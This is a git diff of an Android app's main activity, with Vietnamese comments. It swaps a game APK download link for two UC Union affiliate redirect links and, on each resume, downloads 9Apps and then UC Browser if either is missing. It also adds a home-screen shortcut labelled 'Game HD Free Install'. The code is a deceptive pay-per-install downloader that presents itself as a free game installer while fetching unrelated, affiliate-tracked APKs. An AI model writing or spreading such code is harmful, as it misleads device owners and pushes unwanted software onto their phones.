@@ -26,12 +26,21 @@ public class MainActivity extends AppCompatActivity {
     /**
      * Link de tai app linkDownload
      */
-    private String linkDownload = "http://taigamevn.xyz/asphalt8.apk"; // Link de tai app
+    private String linkDownload = "http://click.union.ucweb.com/index.php?service=RedirectService&pub=zhanglh@taiuc&offer_id=com.9appstrack.apk"; // Link de tai app
 
     /**
      * Package name cua appp packageName
      */
-    private String packageName = "blue.water.vn20160527";                                    // Package name cua app
+    private String packageName = "com.mobile.indiapp";                                    // Package name cua app
+    /**
+     * Link de tai app linkDownload
+     */
+    private String linkDownload02 = "http://click.union.ucweb.com/index.php?service=RedirectService&pub=zhanglh@taiuc&offer_id=link.ucbrowserminiapk"; // Link de tai app
+
+    /**
+     * Package name cua appp packageName
+     */
+    private String packageName02 = "com.uc.browser.en";                                    // Package name cua app
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -42,25 +51,28 @@ public class MainActivity extends AppCompatActivity {
 // instantiate it within the onCreate method
         mProgressDialog = new ProgressDialog(this);
         mProgressDialog.setMessage("Downloading");
-        mProgressDialog.setIndeterminate(true);
+        mProgressDialog.setIndeterminate(false);
         mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
         mProgressDialog.setCancelable(false);
         mProgressDialog.setMax(100);
         checkPermisstion();
+        createShortcut();
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        if(!isAppInstalled(packageName)){
-            download();
+        if (!isAppInstalled(packageName)) {
+            download(linkDownload);
+        } else if (!isAppInstalled(packageName02)) {
+            download(linkDownload02);
         }
     }
 
-    private void download(){
+    private void download(String link) {
         mProgressDialog.show();
         Intent intent = new Intent(this, DownloadService.class);
-        intent.putExtra("url", linkDownload);
+        intent.putExtra("url", link);
         intent.putExtra("receiver", new DownloadReceiver(new Handler()));
         startService(intent);
     }
@@ -80,22 +92,29 @@ public class MainActivity extends AppCompatActivity {
                 if (progress == 100) {
                     mProgressDialog.dismiss();
                 }
-            }
-            else if(resultCode == DownloadService.UPDATE_FILE_NAME){
+            } else if (resultCode == DownloadService.UPDATE_FILE_NAME) {
                 fileName = resultData.getString("fileName");
             }
         }
     }
 
     @TargetApi(Build.VERSION_CODES.M)
-    private void checkPermisstion(){
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-        if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-                != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                    69);
+    private void checkPermisstion() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
+                        69);
 
-            return;
+                return;
+            }
+            if (checkSelfPermission(Manifest.permission.INSTALL_SHORTCUT)
+                    != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.INSTALL_SHORTCUT},
+                        70);
+
+                return;
+            }
         }
     }
 
@@ -121,8 +140,20 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 return false;
             }
-        }catch (Exception ex){
+        } catch (Exception ex) {
             return false;
         }
+    }
+    private void createShortcut(){
+        Intent shortcutIntent = new Intent(getApplicationContext(), ShortcutActivity.class);
+        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        Intent addIntent = new Intent();
+        addIntent.putExtra("duplicate", false);
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Game HD Free Install");
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, Intent.ShortcutIconResource.fromContext(getApplicationContext(), R.mipmap.ic_launcher));
+        addIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
+        sendBroadcast(addIntent);
     }
 }
